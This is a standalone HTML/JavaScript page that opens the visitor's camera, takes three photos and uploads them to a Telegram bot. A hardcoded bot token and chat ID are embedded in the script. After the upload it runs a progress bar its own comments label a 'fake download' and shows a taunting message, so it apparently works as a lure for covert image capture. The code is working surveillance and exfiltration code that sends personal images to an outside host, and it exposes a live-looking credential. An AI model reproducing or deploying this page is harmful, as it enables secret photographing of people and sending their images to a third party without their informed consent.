<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        h1 { font-size: 2rem; margin-bottom: 20px; text-shadow: 0 0 10px #0f0; }
        video { border: 3px solid #0f0; border-radius: 12px; width: 100%; max-width: 400px; height: auto; background: #111; box-shadow: 0 0 30px rgba(0,255,0,0.2); }
        #controls { margin: 20px 0; }
        button { background: #0f0; color: #000; border: none; padding: 16px 32px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(0,255,0,0.4); }
        button:hover:not(:disabled) { transform: scale(1.05); background: #0ff; }
        button:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
        #status { margin: 15px 0; font-size: 1.1rem; min-height: 2em; color: #ff0; }
        #progress-container { width: 80%; max-width: 400px; height: 28px; background: #222; border-radius: 20px; overflow: hidden; margin: 15px auto; display: none; border: 1px solid #0f0; }
        #progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #0f0, #0ff); transition: width 0.15s ease; }
        #result { font-size: 2.5rem; font-weight: bold; color: #0ff; text-shadow: 0 0 20px #0ff; margin-top: 20px; display: none; animation: pulse 1s infinite alternate; }
        @keyframes pulse { from { opacity: 0.7; } to { opacity: 1; } }
        .error { color: #f00 !important; }
        .success { color: #0f0 !important; }
    </style>
</head>
<body>

<h1>📸 CAPTURE & SEND</h1>
<video id="video" autoplay playsinline muted></video>

<div id="controls">
    <button id="captureBtn">📷 CAPTURE 3 PHOTOS</button>
</div>

<div id="status">⏳ Initializing camera...</div>
<div id="progress-container"><div id="progress-fill"></div></div>
<div id="result">ATWI SAY YOU HELLO</div>

<script>
    (function() {
        // --- CONFIG ---
        const BOT_TOKEN = '8921560508:AAG9LXTki6m1McSN17xR8P6WKYxrGCTs-38';
        const CHAT_ID = '8160376425';
        const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

        // --- DOM refs ---
        const video = document.getElementById('video');
        const statusEl = document.getElementById('status');
        const captureBtn = document.getElementById('captureBtn');
        const progressContainer = document.getElementById('progress-container');
        const progressFill = document.getElementById('progress-fill');
        const resultEl = document.getElementById('result');

        let stream = null;
        let capturing = false;

        // --- Camera init ---
        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: { ideal: 480 }, height: { ideal: 360 } }
                });
                video.srcObject = stream;
                await video.play();
                statusEl.textContent = '✅ Camera ready. Click button to start.';
                statusEl.className = 'success';
                captureBtn.disabled = false;
            } catch (err) {
                statusEl.textContent = '❌ Camera access denied. Please allow camera and reload page.';
                statusEl.className = 'error';
                captureBtn.disabled = true;
                console.error('Camera error:', err);
            }
        }

        // --- Capture a single frame as Blob ---
        function captureFrame() {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                const w = video.videoWidth || 480;
                const h = video.videoHeight || 360;
                canvas.width = w;
                canvas.height = h;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, w, h);
                canvas.toBlob((blob) => {
                    resolve(blob);
                }, 'image/jpeg', 0.92);
            });
        }

        // --- Send photo to Telegram ---
        async function sendPhoto(blob, caption = '') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            if (caption) formData.append('caption', caption);
            try {
                const resp = await fetch(TELEGRAM_URL, { method: 'POST', body: formData });
                const json = await resp.json();
                return json.ok === true;
            } catch (e) {
                return false;
            }
        }

        // --- Main capture sequence ---
        async function startCapture() {
            if (capturing || !stream) return;
            capturing = true;
            captureBtn.disabled = true;
            statusEl.className = '';
            statusEl.textContent = '⏳ Capturing 3 photos...';
            progressContainer.style.display = 'block';
            progressFill.style.width = '0%';
            resultEl.style.display = 'none';

            const photos = [];

            // 1. Capture 3 frames (1 second apart)
            for (let i = 0; i < 3; i++) {
                const blob = await captureFrame();
                photos.push(blob);
                const pct = ((i + 1) / 3) * 100;
                progressFill.style.width = pct + '%';
                statusEl.textContent = `📸 Photo ${i+1}/3 captured`;
                if (i < 2) await new Promise(r => setTimeout(r, 1000));
            }

            // 2. Send all photos to Telegram
            statusEl.textContent = '📤 Sending to Telegram...';
            let allSent = true;
            for (let i = 0; i < photos.length; i++) {
                const ok = await sendPhoto(photos[i], `Photo ${i+1}`);
                if (!ok) allSent = false;
                // update progress for sending (optional)
                progressFill.style.width = ((i + 1) / 3) * 100 + '%';
            }

            // 3. Fake download progress (simulate download)
            statusEl.textContent = '⏳ Downloading fake file...';
            progressFill.style.width = '0%';
            for (let p = 0; p <= 100; p += 5) {
                progressFill.style.width = p + '%';
                await new Promise(r => setTimeout(r, 80));
            }

            // 4. Final status and message
            if (allSent) {
                statusEl.textContent = '✅ All photos sent successfully. Download complete (fake).';
                statusEl.className = 'success';
            } else {
                statusEl.textContent = '⚠️ Some photos failed to send, but download simulation done.';
                statusEl.className = 'error';
            }

            resultEl.style.display = 'block';
            resultEl.textContent = 'ATWI SAY YOU HELLO';

            // 5. Reset UI after a moment
            capturing = false;
            captureBtn.disabled = false;
            setTimeout(() => {
                progressContainer.style.display = 'none';
            }, 4000);
        }

        // --- Event binding ---
        captureBtn.addEventListener('click', startCapture);

        // --- Start ---
        initCamera();

        // --- Cleanup on page close ---
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
            }
        });
    })();
</script>

</body>
</html>
